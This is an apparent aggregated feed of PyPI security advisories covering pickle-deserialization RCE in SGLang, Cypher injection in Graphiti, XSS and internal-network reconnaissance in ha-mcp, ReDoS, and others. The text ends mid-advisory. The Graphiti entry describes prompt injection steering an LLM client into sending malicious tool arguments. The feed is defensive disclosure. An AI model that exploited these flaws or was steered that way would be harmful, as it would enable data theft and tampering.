@@ -1,0 +1,699 @@
+{
+  "schema_version": "1.2.0",
+  "generated_at": "2026-03-12T19:51:10Z",
+  "source_id": "pypi_security_advisories",
+  "hash": "sha256:43797e8e4fe68bfc754afd31952d7e617902f1edb92334c1a29e0726e8728823",
+  "prev_hash": "sha256:268eb4b4b30772bc4fc15555f65490eac346008f98ba97561749403995fb09d3",
+  "cursor": "sha256:7ef7fe4f04c420d495eb424a4c4d8d25240e047b82f7d854e98c4ff7801dcf46",
+  "prev_cursor": "sha256:d54e6ee2bec3c90ca589bdd2b81feb2fab81ed49f82371a4d4fc3aa4cdb7aebe",
+  "changed": true,
+  "ttl_sec": 1800,
+  "sources_included": [
+    "pypi_security_advisories"
+  ],
+  "batch_narrative": "pypi_security_advisories: 20 advisories (4 critical, 1 high, 1 low).",
+  "buckets": {
+    "items": [
+      {
+        "source": "pypi_security_advisories",
+        "id": "fe67a5ed088cf6be0c82391b77c052cc",
+        "url": "https://github.com/advisories/GHSA-3936-cmfr-pm3m",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[black] Black: Arbitrary file writes from unsanitized user input in cache file name",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-3936-cmfr-pm3m"
+          ],
+          "content_hash": "sha256:bef897395305600b54d65ef11910145710200cf79d1184326aa2dbc74fc84df0"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Black writes a cache file, the name of which is computed from various formatting options. The value of the <code>--python-cell-magics</code> option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Black 26.3.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not allow untrusted user input into the value of the <code>--python-cell-magics</code> option.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m\">https://github.com/psf/black/security/advisories/GHSA-3936-cmfr-pm3m</a></li>\n<li><a href=\"https://github.com/psf/black/pull/5038\">https://github.com/psf/black/pull/5038</a></li>\n<li><a href=\"https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d\">https://github.com/psf/black/commit/4937fe6cf241139ddbfc16b0bdbb5b422798909d</a></li>\n<li><a href=\"https://github.com/psf/black/releases/tag/26.3.1\">https://github.com/psf/black/releases/tag/26.3.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3936-cmfr-pm3m\">https://github.com/advisories/GHSA-3936-cmfr-pm3m</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T18:33:13.000Z",
+          "date_published": "2026-03-12T18:33:10.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-3936-cmfr-pm3m"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "f98c64da259a48a254c46bcb50678c23",
+        "url": "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[multipart] multipart vulnerable to ReDoS in `parse_options_header()`",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3"
+          ],
+          "content_hash": "sha256:29d42ea9cfb6651c9c8348ed6387a238e7381546ee7633a1457552ed7ebb4aa9"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <code>parse_options_header()</code> function in <code>multipart.py</code> uses a regular expression with an <em>ambiguous alternation</em>, which can cause <em>exponential backtracking (ReDoS)</em> when parsing maliciously crafted HTTP or multipart segment headers. This can be abused for <strong>denial of service (DoS)</strong> attacks against web applications using this library to parse request headers or <code>multipart/form-data</code> streams.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Any WSGI or ASGI application using <code>multipart.parse_form_data()</code> directly or indirectly (e.g. while parsing <code>multipart/form-data</code> streams) is vulnerable. The slow-down is significant enough to block request handling threads for multiple seconds per request.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>All versions up to and including <code>1.3.0</code> are affected. The issue is fixed in <code>1.2.2</code>, <code>1.3.1</code> and <code>1.4.0-dev</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/defnull/multipart/security/advisories/GHSA-p2m9-wcp5-6qw3\">https://github.com/defnull/multipart/security/advisories/GHSA-p2m9-wcp5-6qw3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-28356\">https://nvd.nist.gov/vuln/detail/CVE-2026-28356</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2m9-wcp5-6qw3\">https://github.com/advisories/GHSA-p2m9-wcp5-6qw3</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T18:32:23.000Z",
+          "date_published": "2026-03-12T18:32:18.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "f98c64da259a48a254c46bcb50678c23",
+        "url": "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[multipart] multipart vulnerable to ReDoS in `parse_options_header()`",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3"
+          ],
+          "content_hash": "sha256:29d42ea9cfb6651c9c8348ed6387a238e7381546ee7633a1457552ed7ebb4aa9"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <code>parse_options_header()</code> function in <code>multipart.py</code> uses a regular expression with an <em>ambiguous alternation</em>, which can cause <em>exponential backtracking (ReDoS)</em> when parsing maliciously crafted HTTP or multipart segment headers. This can be abused for <strong>denial of service (DoS)</strong> attacks against web applications using this library to parse request headers or <code>multipart/form-data</code> streams.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Any WSGI or ASGI application using <code>multipart.parse_form_data()</code> directly or indirectly (e.g. while parsing <code>multipart/form-data</code> streams) is vulnerable. The slow-down is significant enough to block request handling threads for multiple seconds per request.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>All versions up to and including <code>1.3.0</code> are affected. The issue is fixed in <code>1.2.2</code>, <code>1.3.1</code> and <code>1.4.0-dev</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/defnull/multipart/security/advisories/GHSA-p2m9-wcp5-6qw3\">https://github.com/defnull/multipart/security/advisories/GHSA-p2m9-wcp5-6qw3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-28356\">https://nvd.nist.gov/vuln/detail/CVE-2026-28356</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2m9-wcp5-6qw3\">https://github.com/advisories/GHSA-p2m9-wcp5-6qw3</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T18:32:23.000Z",
+          "date_published": "2026-03-12T18:32:18.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-p2m9-wcp5-6qw3"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "ed0d81763b6e0c7d44a476a2f63bbdcb",
+        "url": "https://github.com/advisories/GHSA-hvwj-8w5g-28rg",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[sglang] SGLangs `replay_request_dump.py` contains an insecure pickle.load() without validation and proper deserialization",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-hvwj-8w5g-28rg"
+          ],
+          "content_hash": "sha256:1d6d4b021227580d2b31f33b775679feb7409cb287f2cec09c3db69a39a8d79f"
+        },
+        "source_payload": {
+          "content_html": "<p>SGLangs <code>replay_request_dump.py</code> contains an insecure pickle.load() without validation and proper deserialization. An attacker can take advantage of this by providing a malicious .pkl file, which will execute the attackers code on the device running the script.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-3989\">https://nvd.nist.gov/vuln/detail/CVE-2026-3989</a></li>\n<li><a href=\"https://github.com/sgl-project/sglang/blob/main/scripts/playground/replay_request_dump.py\">https://github.com/sgl-project/sglang/blob/main/scripts/playground/replay_request_dump.py</a></li>\n<li><a href=\"https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities\">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hvwj-8w5g-28rg\">https://github.com/advisories/GHSA-hvwj-8w5g-28rg</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:39:04.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-hvwj-8w5g-28rg"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "055a488ffc6e6f47ca50fb570f1f4adb",
+        "url": "https://github.com/advisories/GHSA-rgq9-fqf5-fv58",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[sglang] SGLang's multimodal generation module is vulnerable to unauthenticated remote code execution through the ZMQ broker",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-rgq9-fqf5-fv58"
+          ],
+          "content_hash": "sha256:dee468083eb6a5faad0293bd6bff1a217ff75719d05556a1fd5aeca827825c9d"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-rgq9-fqf5-fv58"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<p>SGLang's multimodal generation module is vulnerable to unauthenticated remote code execution through the ZMQ broker, which deserializes untrusted data using pickle.loads() without authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sgl-project/sglang/security/advisories/GHSA-3cp7-c6q2-94xr\">https://github.com/sgl-project/sglang/security/advisories/GHSA-3cp7-c6q2-94xr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-3059\">https://nvd.nist.gov/vuln/detail/CVE-2026-3059</a></li>\n<li><a href=\"https://github.com/sgl-project/sglang/blob/main/python/sglang/multimodal_gen/runtime/scheduler_client.py\">https://github.com/sgl-project/sglang/blob/main/python/sglang/multimodal_gen/runtime/scheduler_client.py</a></li>\n<li><a href=\"https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities\">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rgq9-fqf5-fv58\">https://github.com/advisories/GHSA-rgq9-fqf5-fv58</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:38:59.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-rgq9-fqf5-fv58"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "d4bfaab1c27cb5ecc5acf32588e3ede6",
+        "url": "https://github.com/advisories/GHSA-jx93-g359-86wm",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[sglang] SGLang's encoder parallel disaggregation system is vulnerable to unauthenticated remote code execution through the disaggregation module",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-jx93-g359-86wm"
+          ],
+          "content_hash": "sha256:e563dfc18be3ab07c296d146229359178b43b87cd76376c3a6943fae1afdfbd3"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-jx93-g359-86wm"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<p>SGLang's encoder parallel disaggregation system is vulnerable to unauthenticated remote code execution through the disaggregation module, which deserializes untrusted data using pickle.loads() without authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-3060\">https://nvd.nist.gov/vuln/detail/CVE-2026-3060</a></li>\n<li><a href=\"https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/encode_receiver.py\">https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/encode_receiver.py</a></li>\n<li><a href=\"https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities\">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jx93-g359-86wm\">https://github.com/advisories/GHSA-jx93-g359-86wm</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:38:54.000Z",
+          "date_published": "2026-03-12T12:30:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-jx93-g359-86wm"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "d280a70bda5186849886fde3132a8fc1",
+        "url": "https://github.com/advisories/GHSA-gg5m-55jj-8m5g",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[graphiti-core] Graphiti vulnerable to Cypher Injection via unsanitized node_labels in search filters",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-gg5m-55jj-8m5g"
+          ],
+          "content_hash": "sha256:045fe73859064906e024b689c9ccc63c647211a3f04fb87100c50432014c00a8"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Graphiti versions before <code>0.28.2</code> contained a Cypher injection vulnerability in shared search-filter construction for non-Kuzu backends. Attacker-controlled label values supplied through <code>SearchFilters.node_labels</code> were concatenated directly into Cypher label expressions without validation.</p>\n<p>In MCP deployments, this was exploitable not only through direct untrusted access to the Graphiti MCP server, but also through prompt injection against an LLM client that could be induced to call <code>search_nodes</code> with attacker-controlled <code>entity_types</code> values. The MCP server mapped <code>entity_types</code> to <code>SearchFilters.node_labels</code>, which then reached the vulnerable Cypher construction path.</p>\n<p>Affected backends included Neo4j, FalkorDB, and Neptune. Kuzu was not affected by the label-injection issue because it used parameterized label handling rather than string-interpolated Cypher labels.</p>\n<p>This issue was mitigated in <code>0.28.2</code>.</p>\n<h3 id=\"affected-versions\">Affected Versions</h3>\n<ul>\n<li><code>0.28.1</code> and earlier</li>\n</ul>\n<h3 id=\"fixed-version\">Fixed Version</h3>\n<ul>\n<li><code>0.28.2</code></li>\n</ul>\n<h3 id=\"affected-components\">Affected Components</h3>\n<ul>\n<li>Graphiti Core search filter construction</li>\n<li>Graphiti MCP Server <code>search_nodes</code> when used by an LLM client processing untrusted prompts</li>\n</ul>\n<h3 id=\"technical-details\">Technical Details</h3>\n<p>Before <code>0.28.2</code>, Graphiti joined <code>SearchFilters.node_labels</code> with <code>|</code> and inserted the result directly into Cypher label expressions in the shared search-filter constructors used by non-Kuzu providers.</p>\n<p>The vulnerable logic was effectively:</p>\n<ul>\n<li><code>node_labels = '|'.join(filters.node_labels)</code></li>\n<li><code>node_label_filter = 'n:' + node_labels</code></li>\n</ul>\n<p>The same pattern was also used in edge-search filter construction.</p>\n<p>In MCP deployments, <code>search_nodes</code> accepted an <code>entity_types</code> argument and passed it directly to <code>SearchFilters(node_labels=entity_types)</code>. An attacker who could influence prompts processed by an LLM client with Graphiti MCP access could use prompt injection to steer the model into invoking <code>search_nodes</code> with crafted <code>entity_types</code> values containing Cypher syntax. Those values would then be interpolated into Cypher before <code>0.28.2</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation could allow arbitrary Cypher execution within the privileges of the configured graph database connection, including:</p>\n<ul>\n<li>reading graph data outside the intended search scope</li>\n<li>modifying graph data</li>\n<li>deleting graph data</li>\n<li>bypassing logical group isolation enforced at the query layer</li>\n</ul>\n<h3 id=\"additional-note-on-group_ids\">Additional Note on <code>group_ids</code></h3>\n<p>Separately, the original report also identified a narrower issue in fulltext search query construction for unvalidated <code>group_ids</code>. That issue was distinct from the Cypher label-injection path described above and was also mitigated in <code>0.28.2</code>.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Upgrade to <code>0.28.2</code> or later.</p>\n<p>Version <code>0.28.2</code> added:</p>\n<ul>\n<li>validation of <code>SearchFilters.node_labels</code></li>\n<li>defense-in-depth label validation in shared search-filter constructors</li>\n<li>validation of entity node labels in persistence query builders</li>\n<li>validation of <code>group_ids</code> in shared search fulltext helpers</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade immediately:</p>\n<ul>\n<li>do not expose Graphiti MCP tools to untrusted users or to LLM workflows that process untrusted prompt content</li>\n<li>avoid passing untrusted values into <code>SearchFilters.node_labels</code> or MCP <code>entity_types</code></li>\n<li>restrict graph database credentials to the minimum privileges required</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>@4n93L for their original report.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getzep/graphiti/security/advisories/GHSA-gg5m-55jj-8m5g\">https://github.com/getzep/graphiti/security/advisories/GHSA-gg5m-55jj-8m5g</a></li>\n<li><a href=\"https://github.com/getzep/graphiti/pull/1312\">https://github.com/getzep/graphiti/pull/1312</a></li>\n<li><a href=\"https://github.com/getzep/graphiti/commit/7d65d5e77e89a199a62d737634eaa26dbb04d037\">https://github.com/getzep/graphiti/commit/7d65d5e77e89a199a62d737634eaa26dbb04d037</a></li>\n<li><a href=\"https://github.com/getzep/graphiti/releases/tag/v0.28.2\">https://github.com/getzep/graphiti/releases/tag/v0.28.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gg5m-55jj-8m5g\">https://github.com/advisories/GHSA-gg5m-55jj-8m5g</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T17:26:18.000Z",
+          "date_published": "2026-03-12T17:26:16.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-gg5m-55jj-8m5g"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "5565e4849a5b41717c1555bad5e41871",
+        "url": "https://github.com/advisories/GHSA-pf93-j98v-25pv",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[ha-mcp] ha-mcp has XSS via Unescaped HTML in OAuth Consent Form",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-pf93-j98v-25pv"
+          ],
+          "content_hash": "sha256:b21a1eb8f246a24bb2b8054280af44db054b52802ebf96af3ba5da015c77fd1c"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The ha-mcp OAuth consent form renders user-controlled parameters via Python f-strings with no HTML escaping. An attacker who can reach the OAuth endpoint and convince the server operator to follow a crafted authorization URL could execute JavaScript in the operator's browser. This affects only users running the beta OAuth mode (<code>ha-mcp-oauth</code>), which is not part of the standard setup and requires explicit configuration.</p>\n<h3 id=\"details\">Details</h3>\n<p><strong>Unescaped f-string rendering</strong></p>\n<p><code>consent_form.py</code> builds HTML using Python f-strings. No call to <code>html.escape()</code> exists anywhere in the file. The following values are rendered unescaped:</p>\n<ul>\n<li><code>client_name</code> / <code>client_id</code> — in HTML element context (lines 299, 303)</li>\n<li><code>client_id</code>, <code>redirect_uri</code>, <code>state</code> — in HTML attribute context (lines 310–312), where a <code>\"</code> character breaks out of <code>value=\"\"</code></li>\n<li><code>error_message</code>, <code>error</code>, <code>error_description</code> — in error display paths (lines 36–40, 496–497)</li>\n</ul>\n<p>An attacker can register a client with a malicious <code>client_name</code> via the <code>/register</code> (DCR) endpoint, which accepts <code>client_name</code> without sanitization. If the server operator then visits a crafted authorization URL for that client, the payload executes in their browser.</p>\n<p><strong>Open Dynamic Client Registration</strong></p>\n<p>DCR is enabled by default with no initial access token required. This is intentional: Claude.ai and ChatGPT must self-register on first use, which is the standard MCP OAuth flow (RFC 7591). Requiring a pre-shared token would break those integrations. Registration alone grants no access — authorization requires an explicit action by the server operator.</p>\n<h3 id=\"impact\">Impact</h3>\n<p><strong>Affected configuration:</strong> OAuth mode only (<code>ha-mcp-oauth</code>, requires <code>MCP_BASE_URL</code>). This mode is in beta and is not included in the main setup documentation. The vast majority of ha-mcp users run stdio mode, which is not affected.</p>\n<p><strong>Attack requirements:</strong></p>\n<ol>\n<li>The attacker can reach the ha-mcp OAuth endpoint (it binds to <code>0.0.0.0</code> in HTTP mode)</li>\n<li>The attacker registers a malicious client via <code>/register</code></li>\n<li>The attacker convinces the <strong>server operator</strong> — the person who set up ha-mcp — to follow a crafted authorization URL for an unrecognized application</li>\n</ol>\n<p>Step 3 is a meaningful social engineering bar: the consent form displays the (unfamiliar) application name, and the operator has no legitimate reason to authorize an OAuth client they didn't initiate through Claude.ai or ChatGPT. Normal usage involves being redirected to the consent form from one of those platforms, not from an external link.</p>\n<p>If exploited, a JavaScript payload could exfiltrate data entered into the consent form, including the Home Assistant Long-Lived Access Token.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Upgrade to 7.0.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv\">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32112\">https://nvd.nist.gov/vuln/detail/CVE-2026-32112</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pf93-j98v-25pv\">https://github.com/advisories/GHSA-pf93-j98v-25pv</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:23:45.000Z",
+          "date_published": "2026-03-12T14:23:44.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-pf93-j98v-25pv"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "2659b1ed5f259fb5b081a7c5c97a055a",
+        "url": "https://github.com/advisories/GHSA-fmfg-9g7c-3vq7",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[ha-mcp] ha-mcp OAuth 2.1 DCR mode enables network reconnaissance via an error oracle",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-fmfg-9g7c-3vq7"
+          ],
+          "content_hash": "sha256:c34d24b2bb2e4414d17cf2b6d50f3822189b9ced58e495120fc5a8135010b334"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The ha-mcp OAuth consent form (beta feature) accepts a user-supplied <code>ha_url</code> and makes a server-side HTTP request to <code>{ha_url}/api/config</code> with no URL validation. An unauthenticated attacker can submit arbitrary URLs to perform internal network reconnaissance via an error oracle. Two additional code paths in OAuth tool calls (REST and WebSocket) are affected by the same primitive.</p>\n<p>The primary deployment method (private URL with pre-configured <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><strong>Code path 1 — Consent form validation</strong> (reported)</p>\n<p>When a user submits the OAuth consent form, <code>_validate_ha_credentials()</code> (<code>provider.py</code>) makes a server-side GET request to <code>{ha_url}/api/config</code> with no scheme, IP, or domain validation. Different exception types produce distinct error messages, creating an error oracle:</p>\n<table>\n<thead>\n<tr>\n<th>Outcome</th>\n<th>Message returned</th>\n<th>Information leaked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>ConnectError</code></td>\n<td>\"Could not connect...\"</td>\n<td>Host down or port closed</td>\n</tr>\n<tr>\n<td><code>TimeoutException</code></td>\n<td>\"Connection timed out...\"</td>\n<td>Host up, port filtered</td>\n</tr>\n<tr>\n<td>HTTP 401</td>\n<td>\"Invalid access token...\"</td>\n<td>Service alive, requires auth</td>\n</tr>\n<tr>\n<td>HTTP 403</td>\n<td>\"Access forbidden...\"</td>\n<td>Service alive, forbidden</td>\n</tr>\n<tr>\n<td>HTTP ≥ 400</td>\n<td>\"Failed to connect: HTTP {N}\"</td>\n<td>Service alive, exact status</td>\n</tr>\n</tbody></table>\n<p>An attacker can drive the flow programmatically: register a client via open DCR (<code>POST /register</code>), initiate authorization, extract a <code>txn_id</code>, and submit arbitrary <code>ha_url</code> values. No user interaction required.</p>\n<p><strong>Code path 2 — REST tool calls with forged token</strong></p>\n<p>OAuth access tokens are stateless base64-encoded JSON payloads (<code>{\"ha_url\": \"...\", \"ha_token\": \"...\"}</code>). Since tokens are not signed, an attacker can forge a token with an arbitrary <code>ha_url</code>. REST tool calls then make HTTP requests to hardcoded HA API paths on that host (<code>/config</code>, <code>/states</code>, <code>/services</code>, etc.). JSON responses are returned to the caller.</p>\n<p>In practice, path control is limited — most endpoints use absolute paths that ignore the <code>ha_url</code> path component. Useful exfiltration requires the target to return JSON at HA API paths, which is unlikely for non-HA services.</p>\n<p><strong>Code path 3 — WebSocket tool calls with forged token</strong></p>\n<p>The same forged token triggers WebSocket connections to <code>ws://{ha_url}/api/websocket</code>. The client follows the HA WebSocket handshake protocol (waits for <code>auth_required</code>, sends <code>auth</code>, expects <code>auth_ok</code>). Non-HA targets fail at the protocol level and return nothing useful. Realistic exploitation is limited to pivoting to another HA instance on the internal network.</p>\n<h3 id=\"impact\">Impact</h3>\n<p><strong>Confirmed:</strong> Internal network reconnaissance via error oracle (all 3 code paths). An attacker can map reachable hosts and open ports from the server's network position.</p>\n<h3 id=\"scope\">Scope</h3>\n<p>OAuth mode is a <strong>beta</strong> feature, documented separately in <code>docs/OAUTH.md</code> and not part of the main setup instructions. The standard deployment method (pre-configured <code>HOMEASSISTANT_URL</code> and <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Upgrade to 7.0.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7\">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32111\">https://nvd.nist.gov/vuln/detail/CVE-2026-32111</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fmfg-9g7c-3vq7\">https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:23:38.000Z",
+          "date_published": "2026-03-12T14:23:37.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-fmfg-9g7c-3vq7"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "bea8920197d963af079e2a4e74d60750",
+        "url": "https://github.com/advisories/GHSA-rcp6-88mm-9vgf",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[copyparty] Copyparty has unexpected JavaScript execution via crafted URL to folder with `.prologue.html`",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-rcp6-88mm-9vgf"
+          ],
+          "content_hash": "sha256:8a4aba4b41c57c3c0cdd0807e316ca554cfce4617498288d2f66b22220114674"
+        },
+        "source_payload": {
+          "content_html": "<p>If an attacker has been given both read- and write-permissions to the server, they can upload a malicious file with the filename <code>.prologue.html</code> and then craft a link to potentially execute arbitrary JavaScript in the victim's context.</p>\n<p>Note that it is intended behavior that the JavaScript would execute if the target clicks a link to the HTML file itself; \"<a href=\"https://example.com/foo/.prologue.html\">https://example.com/foo/.prologue.html</a>\". The vulnerability is that \"<a href=\"https://example.com/foo/?b\">https://example.com/foo/?b</a>\" would also evaluate the file, making the behavior unexpected.</p>\n<p>There are existing preventative measures (strict SameSite cookies) which makes it harder to leverage this vulnerability in an attack; in order to gain control of the target's authenticated session, the link must be clicked from a page served by the server itself -- most likely by editing an existing resource, which would require additional access permissions.</p>\n<p>Finally, for this attack to be successful, the attacker's target must click the specific crafted link given by the attacker. This vulnerability is not activated by normally browsing the web-UI on the server.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>If successful, the malicious JavaScript could move or delete existing files on the server, or upload new files, using the account of the person who opens the link.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 